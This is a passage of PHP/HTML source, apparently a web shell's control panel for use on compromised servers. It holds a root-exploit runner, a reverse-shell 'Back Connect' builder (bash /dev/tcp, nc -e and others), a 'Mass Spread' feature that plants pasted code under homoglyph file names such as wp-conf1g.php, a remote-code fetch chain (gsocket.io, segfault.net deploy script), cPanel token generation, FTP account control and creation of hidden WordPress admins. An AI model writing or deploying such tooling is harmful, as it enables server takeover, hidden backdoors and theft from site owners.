                    <button class="btn btn-sm" style="background:#f59e0b;border-color:#f59e0b;color:#000;font-weight:600;white-space:nowrap;" onclick="doAutoRootCustom()">Run</button>
                </div>
            </div>

            <!-- Execution Log -->
            <div id="arLogPanel" style="display:none;margin-top:14px;">
                <div style="font-size:11px;font-weight:600;color:var(--text-secondary);margin-bottom:6px;">Execution Log</div>
                <pre id="arLog" style="background:#0a0a0a;border:1px solid var(--border);border-radius:6px;padding:12px;font-size:10px;color:#e0e0e0;max-height:250px;overflow-y:auto;white-space:pre-wrap;line-height:1.5;"></pre>
                <div id="arRootBanner" style="display:none;background:rgba(63,185,80,0.12);border:2px solid #3fb950;border-radius:8px;padding:14px;text-align:center;margin-top:10px;">
                    <div style="font-size:18px;font-weight:800;color:#3fb950;">ROOT ACCESS OBTAINED</div>
                    <div style="font-size:11px;color:var(--text-muted);margin-top:4px;" id="arRootInfo"></div>
                </div>
                <div id="arFailBanner" style="display:none;background:rgba(248,81,73,0.08);border:1px solid rgba(248,81,73,0.3);border-radius:6px;padding:10px;text-align:center;margin-top:10px;">
                    <div style="font-size:12px;font-weight:600;color:#f85149;">Exploit did not gain root</div>
                    <div style="font-size:10px;color:var(--text-muted);margin-top:4px;">Try another CVE or use a custom command</div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Backconnect Modal -->
<div class="modal-overlay hidden" id="backconnectModal">
    <div class="modal" style="max-width: 520px;">
        <div class="modal-header" style="border-bottom-color: rgba(239, 68, 68, 0.3);">
            <span class="modal-title" style="color: #ef4444;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
                Back Connect
            </span>
            <button class="modal-close" onclick="hideModal2('backconnectModal')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding: 16px;">
            <div style="background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.2); border-radius: 6px; padding: 10px; margin-bottom: 14px;">
                <p style="color: #ef4444; font-size: 11px; font-weight: 600; margin-bottom: 4px;">Reverse Shell Connection</p>
                <p style="color: var(--text-muted); font-size: 10px;">Start a listener first: <code style="background:rgba(0,0,0,0.3);padding:2px 6px;border-radius:3px;color:#00d4ff;">nc -lvnp [PORT]</code></p>
            </div>
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 10px;">
                <div class="form-group" style="margin-bottom:0;">
                    <label class="form-label">Host / IP</label>
                    <input type="text" id="bcHost" class="form-input" placeholder="e.g. 192.168.1.100">
                </div>
                <div class="form-group" style="margin-bottom:0;">
                    <label class="form-label">Port</label>
                    <input type="number" id="bcPort" class="form-input" placeholder="e.g. 4444" min="1" max="65535">
                </div>
            </div>
            <div class="form-group" style="margin-bottom: 12px;">
                <label class="form-label">Method</label>
                <select id="bcType" class="form-input" onchange="updateBcPreview()">
                    <option value="php">PHP (fsockopen + proc_open)</option>
                    <option value="perl">Perl (Socket)</option>
                    <option value="python">Python3 (subprocess)</option>
                    <option value="nc">Netcat (nc -e)</option>
                    <option value="bash">Bash (/dev/tcp)</option>
                    <option value="ruby">Ruby (TCPSocket)</option>
                </select>
            </div>
            <div style="margin-bottom: 10px;">
                <label class="form-label">Command Preview</label>
                <div id="bcPreview" style="background: var(--bg-input); border: 1px solid var(--border); border-radius: 6px; padding: 10px; font-family: monospace; font-size: 10px; color: #00d4ff; word-break: break-all; max-height: 80px; overflow-y: auto; line-height: 1.4;"></div>
            </div>
            <div style="display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 8px;">
                <span style="font-size: 10px; color: var(--text-muted);">Available exec:</span>
                <?php
                $disabled_fns = array_map('trim', explode(',', ini_get('disable_functions')));
                $exec_fns = ['exec','shell_exec','system','passthru','popen','proc_open','fsockopen'];
                foreach ($exec_fns as $fn) {
                    $avail = function_exists($fn) && !in_array($fn, $disabled_fns);
                    $color = $avail ? '#3fb950' : '#f85149';
                    echo '<span style="font-size:9px;padding:2px 6px;border-radius:3px;background:rgba('.($avail?'63,185,80':'248,81,73').',0.1);color:'.$color.';border:1px solid rgba('.($avail?'63,185,80':'248,81,73').',0.2);">'.$fn.'</span>';
                }
                ?>
            </div>
            <div id="bcResult" style="display:none; margin-top: 10px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 6px; padding: 10px; font-size: 11px; font-family: monospace;"></div>
        </div>
        <div class="modal-footer" style="justify-content: center; gap: 12px;">
            <button class="btn btn-secondary" onclick="hideModal2('backconnectModal')">Cancel</button>
            <button class="btn" id="bcConnBtn" style="background: #ef4444; border-color: #ef4444; color: #fff; font-weight: 600;" onclick="doBackconnect()">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
                Connect
            </button>
        </div>
    </div>
</div>

<!-- Edit File Modal -->
<div class="modal-overlay hidden" id="editFileModal">
    <div class="modal" style="max-width: 800px; max-height: 90vh;">
        <div class="modal-header" style="border-bottom-color: rgba(0, 212, 255, 0.3);">
            <span class="modal-title" style="color: #00d4ff;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
                Edit File: <span id="editFileName" style="color: var(--gold);"></span>
            </span>
            <button class="modal-close" onclick="hideEditModal()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding: 12px;">
            <div id="editLoading" style="text-align:center;padding:40px;color:var(--text-muted);">Loading file content...</div>
            <textarea id="editFileContent" class="editor-area" style="display:none;width:100%;height:55vh;font-family:monospace;font-size:12px;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:10px;resize:vertical;tab-size:4;"></textarea>
        </div>
        <div class="modal-footer" style="justify-content: flex-end; gap: 8px;">
            <button type="button" class="btn btn-secondary" onclick="hideEditModal()">Cancel</button>
            <button type="button" class="btn btn-primary" id="editSaveBtn" onclick="saveEditFile()" disabled>
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/><polyline points="7 3 7 8 15 8"/></svg>
                Save File
            </button>
        </div>
    </div>
</div>
<input type="hidden" id="editFilePath" value="">

<!-- Rename Modal -->
<div class="modal-overlay hidden" id="renameModal">
    <div class="modal" style="max-width: 420px;">
        <div class="modal-header" style="border-bottom-color: rgba(255, 215, 0, 0.3);">
            <span class="modal-title" style="color: var(--gold);">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>
                Rename
            </span>
            <button class="modal-close" onclick="hideRenameModal()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding: 20px;">
            <div style="width: 50px; height: 50px; background: rgba(255,215,0,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--gold)" stroke-width="2"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>
            </div>
            <p style="color: var(--text-muted); font-size: 11px; text-align: center; margin-bottom: 12px;">Current name:</p>
            <p id="renameCurrentName" style="color: var(--gold); font-size: 13px; font-weight: 600; word-break: break-all; text-align: center; margin-bottom: 16px;"></p>
            <div class="form-group" style="margin-bottom: 0;">
                <label class="form-label">New Name</label>
                <input type="text" id="renameNewName" class="form-input" placeholder="Enter new name..." required>
            </div>
        </div>
        <div class="modal-footer" style="justify-content: center; gap: 12px;">
            <button type="button" class="btn btn-secondary" onclick="hideRenameModal()">Cancel</button>
            <button type="button" class="btn btn-primary" onclick="doRename()">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><polyline points="20 6 9 17 4 12"/></svg>
                Rename
            </button>
        </div>
    </div>
</div>
<input type="hidden" id="renameFilePath" value="">

<!-- Chmod Modal -->
<div class="modal-overlay hidden" id="chmodFileModal">
    <div class="modal" style="max-width: 420px;">
        <div class="modal-header" style="border-bottom-color: rgba(63, 185, 80, 0.3);">
            <span class="modal-title" style="color: #3fb950;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                Change Permission
            </span>
            <button class="modal-close" onclick="hideChmodFileModal()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding: 20px;">
            <div style="width: 50px; height: 50px; background: rgba(63,185,80,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#3fb950" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
            </div>
            <p id="chmodFileName" style="color: var(--gold); font-size: 13px; font-weight: 600; word-break: break-all; text-align: center; margin-bottom: 6px;"></p>
            <p style="color: var(--text-muted); font-size: 11px; text-align: center; margin-bottom: 16px;">Current: <span id="chmodCurrentPerm" style="color: #3fb950; font-family: monospace; font-weight: 600;"></span></p>
            <div class="form-group" style="margin-bottom: 12px;">
                <label class="form-label">New Permission</label>
                <input type="text" id="chmodNewPerm" class="form-input" placeholder="e.g. 0755" maxlength="4" style="text-align: center; font-family: monospace; font-size: 16px; font-weight: 600; letter-spacing: 4px;" required>
            </div>
            <div style="display: flex; gap: 6px; justify-content: center; flex-wrap: wrap;">
                <button type="button" class="btn btn-sm btn-secondary" onclick="document.getElementById('chmodNewPerm').value='0755'" style="font-size:10px;padding:3px 8px;font-family:monospace;">0755</button>
                <button type="button" class="btn btn-sm btn-secondary" onclick="document.getElementById('chmodNewPerm').value='0644'" style="font-size:10px;padding:3px 8px;font-family:monospace;">0644</button>
                <button type="button" class="btn btn-sm btn-secondary" onclick="document.getElementById('chmodNewPerm').value='0777'" style="font-size:10px;padding:3px 8px;font-family:monospace;">0777</button>
                <button type="button" class="btn btn-sm btn-secondary" onclick="document.getElementById('chmodNewPerm').value='0444'" style="font-size:10px;padding:3px 8px;font-family:monospace;">0444</button>
                <button type="button" class="btn btn-sm btn-secondary" onclick="document.getElementById('chmodNewPerm').value='0600'" style="font-size:10px;padding:3px 8px;font-family:monospace;">0600</button>
            </div>
        </div>
        <div class="modal-footer" style="justify-content: center; gap: 12px;">
            <button type="button" class="btn btn-secondary" onclick="hideChmodFileModal()">Cancel</button>
            <button type="button" class="btn" style="background: #3fb950; border-color: #3fb950; color: #000; font-weight: 600;" onclick="doChmod()">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><polyline points="20 6 9 17 4 12"/></svg>
                Apply
            </button>
        </div>
    </div>
</div>
<input type="hidden" id="chmodFilePath" value="">

<!-- Mass Chmod Modal -->
<div class="modal-overlay hidden" id="chmodModal">
    <div class="modal" style="max-width: 450px;">
        <div class="modal-header">
            <span class="modal-title">Mass Chmod</span>
            <button class="modal-close" onclick="hideModal('chmod')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <form method="POST">
            <div class="modal-body">
                <div class="form-group">
                    <label class="form-label">Target Path</label>
                    <input type="text" name="chmod_path" class="form-input" value="<?php echo htmlspecialchars($currentDirectory); ?>" required>
                </div>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                    <div class="form-group">
                        <label class="form-label">Folder Permission</label>
                        <input type="text" name="chmod_folder" class="form-input" placeholder="0755" value="0755" maxlength="4" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">File Permission</label>
                        <input type="text" name="chmod_file" class="form-input" placeholder="0644" value="0644" maxlength="4" required>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" onclick="hideModal('chmod')">Cancel</button>
                <button type="submit" name="mass_chmod" class="btn btn-primary">Apply</button>
            </div>
        </form>
    </div>
</div>

<!-- Mass Spread Modal -->
<div class="modal-overlay hidden" id="spreadModal">
    <div class="modal" style="max-width: 550px;">
        <div class="modal-header">
            <span class="modal-title">Mass Spread (Auto-Match)</span>
            <button class="modal-close" onclick="hideModal('spread')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <form method="POST">
            <div class="modal-body">
                <div style="background: rgba(0, 212, 255, 0.08); border: 1px solid rgba(0, 212, 255, 0.2); border-radius: 6px; padding: 12px; margin-bottom: 14px;">
                    <p style="color: var(--accent); font-size: 11px; font-weight: 600; margin-bottom: 6px;">Auto-Match Filename</p>
                    <p style="color: var(--text-muted); font-size: 10px; line-height: 1.5;">Scans each folder for existing PHP files and creates a homoglyph variant automatically. Example: <span style="color:var(--gold);">wp-config.php</span> becomes <span style="color:var(--green);">wp-conf1g.php</span> or <span style="color:var(--green);">wp-c0nfig.php</span></p>
                </div>
                <div class="form-group">
                    <label class="form-label">Paste Code</label>
                    <textarea name="spread_content" class="form-input" style="min-height: 200px; resize: vertical; font-family: monospace;" placeholder="Paste your code here..." required></textarea>
                </div>
                <div style="background: rgba(248, 81, 73, 0.1); border: 1px solid rgba(248, 81, 73, 0.3); border-radius: 6px; padding: 10px;">
                    <p style="color: var(--red); font-size: 11px;">Recursive from: <?php echo htmlspecialchars($currentDirectory); ?></p>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" onclick="hideModal('spread')">Cancel</button>
                <button type="submit" name="mass_spread" class="btn btn-primary">Spread All</button>
            </div>
        </form>
    </div>
</div>

<!-- Multi Upload Modal -->
<div class="modal-overlay hidden" id="multiuploadModal">
    <div class="modal" style="max-width: 550px;">
        <div class="modal-header">
            <span class="modal-title">Multi Upload</span>
            <button class="modal-close" onclick="hideModal('multiupload')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <form method="POST" enctype="multipart/form-data">
            <div class="modal-body">
                <div id="uploadersContainer">
                    <div class="uploader-row">
                        <label class="custom-file-input">
                            <input type="file" name="files[]" onchange="updateFileName(this)">
                            <span class="file-btn">Choose File</span>
                            <span class="file-name">No file selected</span>
                        </label>
                        <button type="button" class="btn btn-danger btn-sm" onclick="removeUploader(this)">X</button>
                    </div>
                </div>
                <button type="button" class="btn btn-secondary btn-sm" onclick="addUploader()" style="margin-top: 10px; width: 100%;">+ Add More</button>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" onclick="hideModal('multiupload')">Cancel</button>
                <button type="submit" name="multi_upload" class="btn btn-primary">Upload All</button>
            </div>
        </form>
    </div>
</div>

<!-- Remote Upload Modal -->
<div class="modal-overlay hidden" id="remoteModal">
    <div class="modal" style="max-width: 450px;">
        <div class="modal-header">
            <span class="modal-title">Remote Upload</span>
            <button class="modal-close" onclick="hideModal('remote')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <form method="POST">
            <div class="modal-body">
                <div class="form-group">
                    <label class="form-label">URL</label>
                    <input type="text" name="remote_url" class="form-input" placeholder="https://example.com/file.php" required>
                </div>
                <div class="form-group">
                    <label class="form-label">Save as (optional)</label>
                    <input type="text" name="remote_filename" class="form-input" placeholder="Leave empty for original name">
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" onclick="hideModal('remote')">Cancel</button>
                <button type="submit" name="remote_upload" class="btn btn-primary">Download</button>
            </div>
        </form>
    </div>
</div>

<!-- GSSocket Modal -->
<div class="modal-overlay hidden" id="gsocketModal">
    <div class="modal" style="max-width: 500px;">
        <div class="modal-header">
            <span class="modal-title" style="color: #10b981;">GSSocket Manager</span>
            <button class="modal-close" onclick="hideModal('gsocket')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <div style="background: rgba(16,185,129,0.08); border: 1px solid rgba(16,185,129,0.2); border-radius: 6px; padding: 12px; margin-bottom: 16px;">
                <p style="color: #10b981; font-size: 11px; font-weight: 600; margin-bottom: 4px;">GSSocket Auto-Install Chain</p>
                <p style="color: var(--text-muted); font-size: 10px; line-height: 1.5;">
                    1. gsocket.io/y (curl/wget)<br>
                    2. segfault.net/deploy-all.sh<br>
                    3. GS_PORT=53 deploy-all.sh
                </p>
            </div>
            <div style="display: flex; gap: 10px;">
                <form method="POST" style="flex: 1;">
                    <input type="hidden" name="gsocket_action" value="1">
                    <input type="hidden" name="gsocket_cmd" value="install">
                    <button type="submit" class="btn btn-gs" style="width: 100%; padding: 10px;">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                        Install
                    </button>
                </form>
                <form method="POST" style="flex: 1;">
                    <input type="hidden" name="gsocket_action" value="1">
                    <input type="hidden" name="gsocket_cmd" value="uninstall">
                    <button type="submit" class="btn btn-danger" style="width: 100%; padding: 10px;">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
                        Uninstall
                    </button>
                </form>
            </div>
        </div>
    </div>
</div>

<!-- UAPI Modal -->
<div class="modal-overlay hidden" id="uapiModal">
    <div class="modal" style="max-width: 520px;">
        <div class="modal-header">
            <span class="modal-title" style="color: #8b5cf6;">UAPI / cPanel Manager</span>
            <button class="modal-close" onclick="hideModal('uapi')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <p style="color: var(--text-muted); font-size: 11px; font-weight: 600; margin-bottom: 10px;">Generate cPanel API Token</p>
            <form method="POST" style="margin-bottom: 20px;">
                <button type="submit" name="cpanel_token" class="btn btn-uapi" style="width: 100%;">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                    Generate Token
                </button>
                <span style="font-size: 10px; color: var(--text-muted);">Creates a full-access API token for cPanel.</span>
            </form>
            <div style="border-top: 1px solid var(--border); padding-top: 16px;">
                <p style="color: var(--text-muted); font-size: 11px; font-weight: 600; margin-bottom: 10px;">Server Info</p>
                <div style="background: var(--bg-secondary); padding: 10px; border-radius: 6px; font-size: 11px; color: var(--text-muted); font-family: monospace;">
                    <div>Domain: <?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'N/A'); ?></div>
                    <div>User: <?php echo htmlspecialchars(get_current_user()); ?></div>
                    <div>Server: <?php echo htmlspecialchars(php_uname('n')); ?></div>
                    <div>PHP: <?php echo phpversion(); ?></div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- FTP Manager Modal -->
<div class="modal-overlay hidden" id="ftpModal">
    <div class="modal" style="max-width: 620px;">
        <div class="modal-header">
            <span class="modal-title" style="color: #f97316;">FTP Manager</span>
            <button class="modal-close" onclick="hideModal('ftp')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <!-- Add FTP -->
            <div style="background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; padding: 14px; margin-bottom: 16px;">
                <p style="color: var(--gold); font-size: 12px; font-weight: 600; margin-bottom: 10px;">Add FTP Account</p>
                <form method="POST">
                    <div style="display: grid; grid-template-columns: 1fr 1fr 80px; gap: 8px; align-items: end;">
                        <div class="form-group" style="margin: 0;">
                            <label class="form-label">Username</label>
                            <input type="text" name="ftp_user" class="form-input" placeholder="ftpuser" required>
                        </div>
                        <div class="form-group" style="margin: 0;">
                            <label class="form-label">Password</label>
                            <input type="text" name="ftp_pass" class="form-input" placeholder="P@ss123!" required>
                        </div>
                        <button type="submit" name="ftp_add" class="btn btn-primary btn-sm" style="height: 36px;">Add</button>
                    </div>
                </form>
            </div>

            <!-- List + Actions -->
            <div style="margin-bottom: 10px;">
                <p style="color: var(--text-primary); font-size: 12px; font-weight: 600;">FTP Accounts</p>
            </div>

            <?php if (!empty($ftpAccounts)): ?>
            <div style="max-height: 300px; overflow-y: auto;">
            <?php foreach ($ftpAccounts as $i => $ftp):
                $ftpLogin = $ftp['login'] ?? $ftp['user'] ?? '';
                $ftpDomain = $ftp['domain'] ?? '';
                $ftpDir = $ftp['homedir'] ?? '';
                $ftpAtSign = strpos($ftpLogin, '@');
                $ftpUserOnly = ($ftpAtSign !== false) ? substr($ftpLogin, 0, $ftpAtSign) : $ftpLogin;
                if (empty($ftpDomain) && $ftpAtSign !== false) $ftpDomain = substr($ftpLogin, $ftpAtSign + 1);
            ?>
            <div style="background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 6px; padding: 10px; margin-bottom: 6px;">
                <div style="display: flex; justify-content: space-between; align-items: center; gap: 8px; flex-wrap: wrap;">
                    <div style="flex: 1; min-width: 180px;">
                        <div style="color: var(--accent); font-size: 12px; font-weight: 600; font-family: monospace;"><?php echo htmlspecialchars($ftpLogin); ?></div>
                        <div style="color: var(--text-muted); font-size: 10px;"><?php echo htmlspecialchars($ftpDir); ?></div>
                    </div>
                    <div style="display: flex; gap: 4px; align-items: center;">
                        <button type="button" class="btn btn-sm btn-secondary" style="padding: 3px 8px; font-size: 10px;" onclick="ftpChgPass('<?php echo htmlspecialchars($ftpUserOnly, ENT_QUOTES); ?>','<?php echo htmlspecialchars($ftpDomain, ENT_QUOTES); ?>')">ChgPass</button>
                        <form method="POST" style="margin:0;" onsubmit="return confirm('Delete <?php echo htmlspecialchars($ftpLogin, ENT_QUOTES); ?>?')">
                            <input type="hidden" name="ftp_del_user" value="<?php echo htmlspecialchars($ftpUserOnly); ?>">
                            <input type="hidden" name="ftp_del_domain" value="<?php echo htmlspecialchars($ftpDomain); ?>">
                            <button type="submit" name="ftp_delete" class="btn btn-sm btn-danger" style="padding: 3px 8px; font-size: 10px;">Del</button>
                        </form>
                    </div>
                </div>
                <!-- Inline change password (hidden by default) -->
                <div id="ftpChg_<?php echo $i; ?>" class="hidden" style="margin-top: 8px; padding-top: 8px; border-top: 1px solid var(--border);">
                    <form method="POST" style="display: flex; gap: 6px; align-items: end;">
                        <input type="hidden" name="ftp_chg_user" value="<?php echo htmlspecialchars($ftpUserOnly); ?>">
                        <input type="hidden" name="ftp_chg_domain" value="<?php echo htmlspecialchars($ftpDomain); ?>">
                        <div style="flex: 1;">
                            <label class="form-label" style="font-size: 10px;">New Password</label>
                            <input type="text" name="ftp_chg_pass" class="form-input" style="font-size: 11px; padding: 6px 8px;" placeholder="NewP@ss!" required>
                        </div>
                        <button type="submit" name="ftp_passwd" class="btn btn-primary btn-sm" style="height: 32px; font-size: 10px;">Save</button>
                    </form>
                </div>
            </div>
            <?php endforeach; ?>
            </div>
            <?php else: ?>
            <div style="text-align: center; padding: 20px; color: var(--text-muted); font-size: 11px;">
                No FTP accounts found.
            </div>
            <?php endif; ?>
        </div>
    </div>
</div>

<!-- WordPress Manager Modal -->
<?php if ($wpAvailable): ?>
<div class="modal-overlay hidden" id="wpModal">
    <div class="modal" style="max-width: 820px; max-height: 90vh; overflow-y: auto;">
        <div class="modal-header">
            <span class="modal-title" style="color: #3b82f6;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display: inline; vertical-align: middle;"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/></svg>
                WordPress Manager
            </span>
            <button class="modal-close" onclick="hideModal('wp')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <!-- Create Admin -->
            <div style="background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; padding: 14px; margin-bottom: 16px;">
                <p style="color: #3fb950; font-size: 12px; font-weight: 600; margin-bottom: 10px;">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display: inline; vertical-align: middle;"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="8.5" cy="7" r="4"/><line x1="20" y1="8" x2="20" y2="14"/><line x1="23" y1="11" x2="17" y2="11"/></svg>
                    Create Admin User
                </p>
                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-bottom: 8px;">
                    <div class="form-group" style="margin: 0;">
                        <label class="form-label">Username</label>
                        <input type="text" id="wpNewUser" class="form-input" placeholder="admin_user">
                    </div>
                    <div class="form-group" style="margin: 0;">
                        <label class="form-label">Password</label>
                        <input type="text" id="wpNewPass" class="form-input" placeholder="P@ssw0rd!">
                    </div>
                    <div class="form-group" style="margin: 0;">
                        <label class="form-label">Email (optional)</label>
                        <input type="text" id="wpNewEmail" class="form-input" placeholder="user@domain.com">
                    </div>
                </div>
                <div style="display: flex; align-items: center; gap: 10px;">
                    <label style="display: flex; align-items: center; gap: 6px; font-size: 11px; color: var(--text-muted); cursor: pointer; margin: 0;">
                        <input type="checkbox" id="wpHideUser" style="width: auto; accent-color: #7c3aed;">
                        Hide user from WP admin panel
                    </label>
                    <button type="button" class="btn btn-sm btn-primary" onclick="wpCreateAdmin()" style="margin-left: auto; padding: 6px 16px;">Create</button>
                </div>
                <div id="wpCreateStatus" style="display: none; margin-top: 8px; padding: 8px 12px; border-radius: 6px; font-size: 11px;"></div>
            </div>

            <!-- User List -->
            <div style="margin-bottom: 10px;">
                <p style="color: var(--text-primary); font-size: 12px; font-weight: 600;">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display: inline; vertical-align: middle;"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
                    WordPress Users
                </p>
            </div>

            <div id="wpUserList" style="max-height: 400px; overflow-y: auto;">
                <div style="text-align: center; padding: 20px; color: var(--text-muted); font-size: 11px;">Loading...</div>
            </div>
        </div>
    </div>
</div>

<!-- WP Delete Confirm Modal -->
<div class="modal-overlay hidden" id="wpDeleteModal" style="z-index: 1001;">
    <div class="modal" style="max-width: 400px;">
        <div class="modal-header">
            <span class="modal-title" style="color: #f85149;">Confirm Delete</span>
            <button class="modal-close" onclick="hideModal('wpDelete')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <p style="color: var(--text-muted); font-size: 12px;">Delete user <strong id="wpDeleteName" style="color: #f85149;"></strong>? This cannot be undone.</p>
            <div style="display: flex; gap: 8px; margin-top: 14px; justify-content: flex-end;">
                <button class="btn btn-sm btn-secondary" onclick="hideModal('wpDelete')">Cancel</button>
